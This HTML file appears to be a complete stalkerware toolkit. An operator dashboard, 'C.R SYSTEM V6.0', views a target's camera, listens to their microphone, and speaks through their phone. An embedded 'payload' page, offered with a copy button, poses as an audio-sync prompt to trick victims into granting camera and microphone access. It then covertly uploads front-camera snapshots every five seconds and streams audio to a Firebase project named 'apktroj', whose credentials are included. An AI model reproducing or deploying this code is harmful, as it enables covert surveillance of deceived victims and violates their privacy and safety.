<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R SYSTEM V6.0 - TWO-WAY BRIDGE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; }
        .cr-card { background: #050505; border: 1px solid #1a1a1a; border-radius: 8px; }
        .btn-ptt { background: #1a1a1a; border: 1px solid #333; transition: all 0.2s; }
        .btn-ptt:active { background: #991b1b; border-color: #f87171; color: #fff; transform: scale(0.98); }
        .glow-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.3); }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-5xl mx-auto space-y-6">
        <!-- Tab Switcher -->
        <div class="flex border-b border-zinc-800">
            <button onclick="setTab('admin')" id="t-admin" class="px-6 py-2 text-[10px] font-bold border-b-2 border-green-500">ADMIN CONSOLE</button>
            <button onclick="setTab('target')" id="t-target" class="px-6 py-2 text-[10px] font-bold text-zinc-600">PAYLOAD V6</button>
        </div>

        <!-- ADMIN DASHBOARD -->
        <div id="panel-admin" class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div class="lg:col-span-2 space-y-4">
                <!-- Visual Feed -->
                <div class="cr-card aspect-video relative overflow-hidden flex items-center justify-center border-2 border-zinc-900">
                    <img id="display-frame" class="w-full h-full object-cover hidden" src="">
                    <div id="no-signal" class="text-center">
                        <p class="text-[9px] uppercase tracking-widest text-zinc-700">Waiting for Camera Feed...</p>
                    </div>
                    <div class="absolute top-4 left-4 bg-red-600 px-2 py-0.5 rounded text-[8px] font-bold animate-pulse">REC</div>
                </div>

                <!-- Info Grid -->
                <div class="grid grid-cols-2 gap-4">
                    <div class="cr-card p-4">
                        <p class="text-[9px] text-zinc-500 uppercase mb-2">Target Audio</p>
                        <div class="flex items-end gap-1 h-8" id="audio-viz">
                            <div class="bg-green-500 w-full h-1"></div>
                            <div class="bg-green-500 w-full h-1"></div>
                            <div class="bg-green-500 w-full h-1"></div>
                        </div>
                    </div>
                    <div class="cr-card p-4">
                        <p class="text-[9px] text-zinc-500 uppercase">GPS Position</p>
                        <p id="loc-text" class="text-[10px] font-bold">Offline</p>
                    </div>
                </div>
            </div>

            <!-- Admin Audio Controls -->
            <div class="space-y-4">
                <div class="cr-card p-5 space-y-6">
                    <div>
                        <h2 class="text-[10px] font-bold text-green-700 uppercase mb-4">1. Browser Sync</h2>
                        <button onclick="enableAudio()" id="audio-init" class="w-full py-3 rounded bg-red-950/20 border border-red-900 text-red-500 text-[9px] font-bold uppercase hover:bg-red-600 hover:text-white">
                            Aktifkan Suara Dashboard
                        </button>
                    </div>

                    <div class="pt-4 border-t border-zinc-900">
                        <h2 class="text-[10px] font-bold text-blue-700 uppercase mb-4">2. Talk to Target (Speaker)</h2>
                        <button id="ptt-btn" class="w-full py-10 rounded-xl btn-ptt text-[10px] font-black uppercase glow-red">
                            Tahan & Bicara ke Target
                        </button>
                        <p class="text-[8px] text-center text-zinc-600 mt-2">Suara lo bakal langsung bunyi di HP target.</p>
                    </div>
                </div>

                <div class="cr-card p-4 h-40 overflow-y-auto font-mono text-[9px] text-zinc-600 space-y-1" id="log-box">
                    <p>> [SYS] Bridge V6 Online.</p>
                </div>
            </div>
        </div>

        <!-- PAYLOAD PANEL -->
        <div id="panel-target" class="hidden">
            <div class="cr-card p-6 space-y-4">
                <h2 class="text-sm font-bold text-green-500">Target Source (index.html)</h2>
                <textarea id="payload-src" readonly class="w-full h-80 bg-black border border-zinc-800 p-4 text-[10px] text-green-800 outline-none font-mono"></textarea>
                <button onclick="copyPayload()" class="bg-green-900 px-6 py-2 rounded text-[10px] font-bold">COPY CODE</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, doc, setDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);

        // PAYLOAD TEMPLATE V6
        const rawPayload = `<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>System Sync</title></head>
<body style="background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
  <div style="text-align:center;padding:20px">
    <div style="background:#4285f4;width:60px;height:60px;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:30px">S</div>
    <h2 style="font-size:18px">Sinkronisasi Audio</h2>
    <p style="font-size:12px;color:#888">Klik izinkan untuk sinkronisasi perangkat.</p>
    <button id="auth" style="background:#4285f4;color:#fff;border:none;width:100%;padding:16px;border-radius:8px;font-weight:bold;margin-top:20px">SINKRONKAN</button>
    <video id="v" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
  </div>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
    import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
    
    const app = initializeApp(${JSON.stringify(firebaseConfig)});
    const db = getFirestore(app);
    const auth = getAuth(app);
    let aCtx;

    document.getElementById('auth').onclick = async () => {
      try {
        await signInAnonymously(auth);
        aCtx = new (window.AudioContext || window.webkitAudioContext)();
        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:{facingMode:"user"}});
        document.getElementById('auth').innerText = "TERHUBUNG";
        document.getElementById('auth').disabled = true;

        const v = document.getElementById('v'); v.srcObject = s;
        const c = document.getElementById('c'); const ctx = c.getContext('2d');

        // Capture Video every 5s
        setInterval(() => {
          c.width = v.videoWidth; c.height = v.videoHeight;
          ctx.drawImage(v, 0, 0);
          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { data: c.toDataURL('image/jpeg', 0.4), time: Date.now() });
        }, 5000);

        // Listen for Admin's Voice (The "Suara ke Target" fix)
        onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'admin_voice'), (snap) => {
          if(snap.exists() && aCtx) {
            const d = snap.data();
            fetch(d.chunk).then(r => r.arrayBuffer()).then(b => aCtx.decodeAudioData(b)).then(buf => {
              const src = aCtx.createBufferSource();
              src.buffer = buf; src.connect(aCtx.destination); src.start();
            });
          }
        });

        // Send Target's Voice to Admin
        const mr = new MediaRecorder(s);
        mr.ondataavailable = (e) => {
          const r = new FileReader();
          r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'target_voice'), { chunk: r.result, time: Date.now() });
          r.readAsDataURL(e.data);
        };
        mr.start(2000);
      } catch(e) { alert("Error: Izin ditolak."); }
    };
  </scr` + `ipt>
</body>
</html>`;

        document.getElementById('payload-src').value = rawPayload;

        // ADMIN CORE
        let aCtx, adminRecorder;
        
        window.enableAudio = () => {
            aCtx = new (window.AudioContext || window.webkitAudioContext)();
            const btn = document.getElementById('audio-init');
            btn.innerText = "DASHBOARD AUDIO READY";
            btn.className = "w-full py-3 rounded bg-green-900/40 border border-green-500 text-green-400 text-[9px] font-bold uppercase";
            addLog("Audio Context Unlocked.");
        };

        // ADMIN VOICE RECORDING (Talk to Target)
        async function setupAdminMic() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                adminRecorder = new MediaRecorder(s);
                adminRecorder.ondataavailable = (e) => {
                    const r = new FileReader();
                    r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'admin_voice'), { chunk: r.result, time: Date.now() });
                    r.readAsDataURL(e.data);
                };
            } catch(e) { addLog("Mic Admin Gagal: " + e.message); }
        }

        const pttBtn = document.getElementById('ptt-btn');
        pttBtn.onmousedown = () => { if(adminRecorder) { adminRecorder.start(); addLog("Transmitting to target..."); } };
        pttBtn.onmouseup = () => { if(adminRecorder && adminRecorder.state === "recording") { adminRecorder.stop(); addLog("Transmission ended."); } };

        async function init() {
            await signInAnonymously(auth);
            setupAdminMic();
            startMonitoring();
        }

        function startMonitoring() {
            // Target Visual
            onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), (snap) => {
                if(snap.exists()) {
                    const img = document.getElementById('display-frame');
                    img.src = snap.data().data;
                    img.classList.remove('hidden');
                    document.getElementById('no-signal').classList.add('hidden');
                }
            });

            // Target Audio (Listen to them)
            onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'target_voice'), (snap) => {
                if(snap.exists() && aCtx) {
                    playChunk(snap.data().chunk);
                }
            });
        }

        function playChunk(url) {
            fetch(url).then(r => r.arrayBuffer()).then(b => aCtx.decodeAudioData(b)).then(buf => {
                const s = aCtx.createBufferSource();
                s.buffer = buf; s.connect(aCtx.destination); s.start();
            });
        }

        window.setTab = (t) => {
            document.getElementById('panel-admin').classList.toggle('hidden', t !== 'admin');
            document.getElementById('panel-target').classList.toggle('hidden', t !== 'target');
        };

        window.copyPayload = () => {
            document.getElementById('payload-src').select();
            document.execCommand('copy');
            addLog("V6 Payload Copied.");
        };

        function addLog(m) {
            const b = document.getElementById('log-box');
            b.innerHTML += `<p>> [${new Date().toLocaleTimeString()}] ${m}</p>`;
            b.scrollTop = b.scrollHeight;
        }

        init();
    </script>
</body>
</html>
